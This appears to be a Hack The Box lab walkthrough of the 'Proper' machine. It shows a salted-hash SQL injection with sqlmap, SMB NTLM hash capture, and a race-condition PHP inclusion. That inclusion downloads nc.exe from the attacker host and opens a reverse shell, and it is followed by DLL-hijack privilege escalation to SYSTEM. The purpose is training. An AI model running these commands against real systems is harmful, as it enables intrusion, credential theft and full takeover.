@@ -1,0 +1,308 @@
+Proper
+
+02nd August 2021 / Document No D21.100.126
+Prepared By: MrR3boot
+Machine Author(s): xct & jkr
+Difficulty: Hard
+Classification: Official
+Synopsis
+
+Proper is a hard difficulty Linux machine which features a web application loading products using an Ajax
+call leaking a secret key which helps in generating token that allows performing SQL Injection. The data
+obtained allows us to login to License portal having a feature to change the themes of the application. This
+feature leaks source code and found to be vulnerable to race condition using which foothold can be gained.
+A service having client server model allowing privileged writes which can be abused to gain system access.
+
+Skills Required
+
+      Enumeration
+      OWASP Top 10
+      Race Condition Exploitation
+
+Skills Learned
+
+      Reversing Go applications
+      Exploiting Privileged Write Capabilities
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.231 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -sC -sV -p$ports 10.10.10.231
+
+Nmap scan revealed that the target server has port 80 open which is running Microsoft IIS service.
+
+IIS
+
+Browsing to port 80 reveals an e-commerce application.
+
+There's nothing found to be interesting in this application.
+
+FFUF
+FFUF
+
+Let's fuzz for files and folders using the ffuf tool.
+
+Fuzzing revealed licenses folder. Let's browse to it.
+Trying bruteforce and SQL Injection attacks failed on this page. Checking index.html page source reveals a
+link.
+
+    Note: This request can also be tracked in burp proxy history or browsers network tab while browsing.
+
+Sending a request to this link loads the products displayed in the application. The order parameter sends a
+query statement. It is worth testing this parameter for possible SQL Injection vulnerability. Changing the
+order parameter value to id+asc throws indeed an error.
+
+If h parameter is not supplied at all, the application responds with a stack trace.
+The stack trace is disclosing the SECURE_PARAM_SALT value. Most of the developers do salted hashing either
+by adding salt as prefix or suffix. We can try to generate a hash for the order parameter with id desc
+using the found salted value.
+
+   import hashlib
+   hash = hashlib.md5()
+   salt = 'hie0shah6ooNoim'
+   hash.update((salt+"id desc").encode('utf-8'))
+   print(hash.hexdigest())
+
+This hash found to be the same. So the hash format is md5(salt+input) . Sending the request for ' as
+order parameter value produces though 500 Internal Server Error .
+Let's run the below command to confirm the SQL Injection vulnerability.
+   sqlmap -u 'http://10.10.10.231/products-ajax.php?
+   order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b' --eval="import
+   hashlib;h=hashlib.md5('hie0shah6ooNoim'.encode('ascii')+order.encode('ascii')).hexdiges
+   t()"
+
+This attack is indeed successful and now it is possible to enumerate the databases.
+   sqlmap -u 'http://10.10.10.231/products-ajax.php?
+   order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b' --eval="import
+   hashlib;h=hashlib.md5('hie0shah6ooNoim'.encode('ascii')+order.encode('ascii')).hexdiges
+   t()" --dbms MySQL --dbs --threads 10
+There are 3 databases. cleaner looks promising. Let's fetch the tables from this database.
+   sqlmap -u 'http://10.10.10.231/products-ajax.php?
+   order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b' --eval="import
+   hashlib;h=hashlib.md5('hie0shah6ooNoim'.encode('ascii')+order.encode('ascii')).hexdiges
+   t()" --dbms MySQL -D cleaner --tables --threads 10
+
+There are 3 tables present in this database. We dump the customers table.
+   sqlmap -u 'http://10.10.10.231/products-ajax.php?
+   order=id+desc&h=a1b30d31d344a5a4e41e8496ccbdd26b' --eval="import
+   hashlib;h=hashlib.md5('hie0shah6ooNoim'.encode('ascii')+order.encode('ascii')).hexdiges
+   t()" --dbms MySQL -D cleaner -T customers --dump --threads 10
+This reveals customers details including email and password hashes. By providing a wordlist to SQLMap, we
+can crack all password hashes.
+
+Trying any of the email address and password will allow us to login to /licenses .
+Foothold
+
+This portal shows license details for a customer. In addition, customer can change the portal theme by
+clicking on theme names on top right of the menu bar. Clicking on any of the themes sends below request.
+
+Application is changing themes through the theme parameter. There are high probability that it maybe
+including a html or php file. Let's try to alter this parameter with .. by updating the hash.
+
+This throws an error as it fails to find header.inc file due to traversal. The error reveals that the
+application is making use of file_get_contents() function to change the themes. We can try for Remote
+File Inclusion by specifying a URL pointing to a file containing PHP code.
+Target server has http:// wrapper disabled in the configuration. It is not possible to perform RFI in this
+case. But smbserver can be used. We start a smbserver using impacket's smbserver.py.
+
+   sudo smbserver2.py -smb2support test .
+Now we send the below request.
+
+We observe that the application is trying to include header.inc file from the error message. On the listener
+side, we notice that the NTLM hash of web user is captured.
+The null sessions are no longer allowed by default in windows, however hash can be cracked using
+JohnTheRipper tool.
+
+Now we create header.inc file and fire-up smbserver with the credentials.
+   echo 'test' > header.inc
+   sudo smbserver.py -smb2support -username web -password 'charlotte123!' test .
+
+Sending request to \\10.10.14.177\test will include header.inc file and display test on the webpage.
+Application is filtering <? tag and won't include the file if the tag is found anywhere in the file contents.
+
+There's a check done using file_get_contents() function which opens and closes the file. The include
+function will open it again, leaving the possibility for using a race condition to swap the file after the check.
+We create two files with below contents.
+header.inc
+
+   fallocate -l 1M header.inc
+shell.inc
+
+   <?php phpinfo(); ?>
+Now issue the following command to copy shell.inc file to header.inc .
+
+   sudo apt install inotify-tools
+   inotifywait header.inc; sleep 4 ; cp pwn.inc header.inc
+Sending the request will first read header.inc file which is of 1MB size then the bash command will
+identifies the file change and update the header.inc file contents to php code. This results in code
+execution.
+This is successful. We update the code in order to get the reverse shell.
+pwn.inc
+
+   <?php exec("powershell wget http://10.10.14.177/nc.exe -o
+   c:\\windows\\system32\\spool\\drivers\\color\\nc.exe"); ?>
+Sending the above request will download nc.exe from our system. We setup a netcat listener on port 1234
+and issue another request with below code.
+   <?php exec("c:\\windows\\system32\\spool\\drivers\\color\\nc.exe -e cmd.exe
+   10.10.14.177 1234"); ?>
+
+A shell as proper\web user is received and user flag can be found in c:\users\web\desktop .
+Privilege Escalation
+
+Enumerating the server, we find an unusual folder Cleanup in Program Files directory.
+
+It contain three files.
+
+README.md reveals the details about the Cleanup service.
+This service tries to locate the garbage files on the system and deletes them. We copy both the files to our
+machine using smbserver.
+
+   copy client.exe \\10.10.14.177\test\client.exe
+   copy server.exe \\10.10.14.177\test\server.exe
+We transfer the files to our Windows VM and run them.
+
+On the server window we look at the details of the files that are being cleaned.
+
+We open both the executables in tool Ghidra. main.main function in client.exe has the below checks.
+   ...
+   if ((longlong)DAT_005fd218 < 2) {
+
+      local_58 = 5;
+      local_38 = (int *)&DAT_0051d3e4;
+   }
+   else {
+      if (DAT_005fd210[3] == (char *)0x2) {
+
+          if (*(short *)DAT_005fd210[2] == 0x522d) {
+              local_58 = 7;
+              local_38 = &DAT_0051d7b0;
+
+          }
+   ...
+If supplied arguments are less than 2, it simply calls main.clean function. In any other case it checks if the
+first supplied argument is -R (0x522d) and the service tries to restore the file to the original location by
+calling main.restore function. It can be easily guessed this time that the second argument for restore
+option is the file path. We can confirm this by restoring test.txt .
+
+There's also a condition while cleaning the files.
+   if (0x278d00 < (local_e0 + -0xe7791f700) - (longlong)&stack0xfffffff1886e08d8) {
+      main.serviceClean();
+   }
+
+It checks if the file is older than 30 days (0x278d00 = 2592000) , then it removes that file from the system.
+Both the executables are communicating via named pipes. We check if there's a named pipe with name
+cleanup .
+
+   dir \\.\pipe\\ | findstr cleanup
+
+It is also possible to trigger the clean/restore operations by directly sending below commands to the
+named pipe.
+   echo CLEAN <filename> > \\.\pipe\\cleanupPipe
+   echo RESTORE <filename> > \\.\pipe\\cleanupPipe
+
+For some reason the last character of the filename is truncated. So we append a new character at the end
+to make it proper. If we try to restore a new file which is not removed, the server window will error out the
+path from where it is restoring the files.
+
+   echo RESTORE c:\users\htb\testt > \\.\pipe\\cleanupPipe
+
+The filename which is cleaned by the service is in the base64 encoded format. With this knowledge we can
+now gain a privileged write by replacing base64 encoded filepath with the path where we want to restore
+the file to. This can be exploited with several ways.
+
+Windows Update Session Orchestrator
+
+Starting from Windows 10, Microsoft introduced the Update Session Orchestrator service. As a regular
+user, it is possible to interact with this service using COM, and start an update scan or start the download
+of pending updates for example. We download and compile the UsoDllLoader project in a Windows VM. We
+copy the WindowsCoreDeviceInfo.dll file to our target server using again the smb server.
+
+   copy \\10.10.14.177\test\WindowsCoreDeviceInfo.dll C:\Users\web\Downloads\
+
+We also modify the attributes so that the file be of 30 days older.
+
+   powershell -ep bypass
+   $(Get-Item "C:\Users\web\Downloads\WindowsCoreDeviceInfo.dll").Lastwritetime=$(Get-Date
+   "12/12/2011")
+   $(Get-Item "C:\Users\web\Downloads\WindowsCoreDeviceInfo.dll").creationtime=$(Get-Date
+   "12/12/2011")
+   $(Get-Item "C:\Users\web\Downloads\WindowsCoreDeviceInfo.dll").lastaccesstime=$(Get-
+   Date "12/12/2011")
+
+Now we run client.exe to clean the file.
+
+   & "C:\program files\cleanup\client.exe"
+
+File is indeed created.
+We copy this file as C:\Windows\System32\WindowsCoreDeviceInfo.dll .
+   copy
+   \programdata\cleanup\QzpcVXNlcnNcd2ViXERvd25sb2Fkc1xXaW5kb3dzQ29yZURldmljZUluZm8uZGxs
+   \programdata\cleanup\QzpcV2luZG93c1xTeXN0ZW0zMlxXaW5kb3dzQ29yZURldmljZUluZm8uZGxs
+
+Now the file can be restored.
+   & "C:\program files\cleanup\client.exe" -R
+   C:\Windows\System32\WindowsCoreDeviceInfo.dll
+
+File is indeed copied to C:\Windows\System32 directory. Let's initiate the updates scan using
+usoclient.exe executable.
+
+   usoclient StartInteractiveScan
+This loads the WindowsCoreDeviceInfo.dll which opens up a bind shell listening 1337 port locally.
+Shell as nt authority\system can be obtained by connecting to this port.
+Alternate Method 1 (Windows Problem
+Reporting Service)
+
+Windows Problem Reporting service wermgr.exe loads phoneinfo.dll on boot which is missing by
+default on most of the Windows operating systems. It is also possible to load this dll without rebooting the
+target server which is mentioned in WerTrigger repository. Let's download phoneinfo.dll , Report.wer
+and WerTrigger.exe files from the repository and copy them to the target host.
+
+   copy \\10.10.14.177\test\phoneinfo.dll .
+   copy \\10.10.14.177\test\WerTrigger.exe .
+   copy \\10.10.14.177\test\Report.wer .
+
+Modify the attributes of phoneinfo.dll file.
+
+   $(Get-Item "C:\Users\web\Downloads\phoneinfo.dll").Lastwritetime=$(Get-Date
+   "12/12/2011")
+   $(Get-Item "C:\Users\web\Downloads\phoneinfo.dll").creationtime=$(Get-Date
+   "12/12/2011")
+   $(Get-Item "C:\Users\web\Downloads\phoneinfo.dll").lastaccesstime=$(Get-Date
+   "12/12/2011")
+
+Now we run client.exe to clean the file.
+
+   & "C:\program files\cleanup\client.exe"
+
+This creates the file in \programdata\cleanup folder. We copy this file as
+C:\Windows\System32\phoneinfo.dll .
+
+   copy \programdata\cleanup\QzpcVXNlcnNcd2ViXERvd25sb2Fkc1xwaG9uZWluZm8uZGxs
+   \programdata\cleanup\QzpcV2luZG93c1xTeXN0ZW0zMlxwaG9uZWluZm8uZGxs
+
+We finally trigger the restore option to copy this file to System32 directory.
+
+   & "C:\program files\cleanup\client.exe" -R C:\Windows\System32\phoneinfo.dll
+
+This is successful and the file is copied.
+We run WerTrigger.exe to trigger the service.
+This is successful and a shell as nt authority\system is spawned.
+Alternate Method 2 (Symlink)
+
+It is also possible to gain read access to any file using symbolic links. We can create a symlink to
+C:\Users\Administrator\Desktop folder.
+
+   mklink /j c:\users\web\downloads\test c:\users\administrator\desktop
+
+We clean the file which we want to read and remove the symlink and create the same folder to restore the
+target file.
+
+   echo CLEAN c:\users\web\downloads\test\root.txtt > \\.\pipe\\cleanupPipe
+   rmdir c:\users\web\downloads\test
+   mkdir c:\users\web\downloads\test
+Now it is possible to try to restore the file.
+   echo RESTORE c:\users\web\downloads\test\root.txtt > \\.\pipe\\cleanupPipe
+We see that the file is restored and has also contents.
+
